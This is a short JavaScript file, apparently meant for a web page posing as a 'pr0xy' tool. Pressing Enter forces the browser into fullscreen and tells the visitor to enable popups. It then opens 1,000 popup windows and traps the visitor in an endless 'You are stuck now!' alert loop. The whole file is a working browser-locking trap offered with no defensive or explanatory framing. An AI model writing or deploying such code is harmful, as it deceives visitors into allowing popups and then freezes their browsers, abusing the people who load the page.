var elem = document.documentElement;
function openFullscreen() {
  try {
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) {
      /* Safari */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
      /* IE11 */
      elem.msRequestFullscreen();
    }
  } catch (e) {
    alert(e);
  }
}

function submit() {
  openFullscreen();

  alert("Please enable popups for pr0xy");
  setTimeout(function () {
    for (let i = 0; i < 1000; i++) {
      window.open("pork", "", "width=1000");
    }
    openFullscreen();
    while (true) {
      alert("You are stuck now!");
    }
  }, 2000);
}

window.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    submit();
  }
});
